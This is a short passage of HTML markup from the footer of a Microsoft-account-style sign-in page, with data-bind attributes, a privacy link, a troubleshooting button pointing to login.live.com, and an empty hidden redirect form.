                'background-always-visible': hasDarkBackground }"class="ext-footer-content ext-footer-item footer-content footer-item">Privacy & cookies</a><a href="https://login.live.com/#"id="moreOptions"data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
        externalCss: {
            'footer-content': true,
            'footer-item': true,
            'debug-item': true,
            'has-background': !useDefaultBackground,
            'background-always-visible': hasDarkBackground }"class="ext-footer-content ext-footer-item footer-content footer-item debug-item ext-debug-item"aria-expanded="false"aria-label="Click here for troubleshooting information"role="button">...</a></div></div></div></div></div></div></form><form data-bind="postRedirectForm: postRedirect"method="POST"target="_top"aria-hidden="true"></form></div></body></html>